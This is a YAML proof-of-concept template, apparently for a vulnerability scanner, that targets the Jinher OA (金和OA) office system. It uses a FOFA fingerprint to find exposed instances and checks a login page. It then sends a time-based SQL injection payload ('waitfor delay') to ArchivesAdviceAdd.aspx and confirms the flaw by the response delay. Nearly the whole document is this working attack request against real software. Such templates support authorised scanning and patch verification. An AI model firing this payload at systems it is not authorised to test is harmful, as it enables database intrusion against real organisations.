id: poc-yaml-jinher-archivesadviceadd-aspx-sqli
info:
  name: 金和OA ArchivesAdviceAdd.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.Archives/ArchivesAdviceAdd.aspx/?fileid=1&filetype=1'waitfor+delay'0:0:{{.t1}}'--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"反馈意见") &&

    contains(gbk_decode(body),"请录入您的意见") &&

    contains(gbk_decode(body),"其他人的意见") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
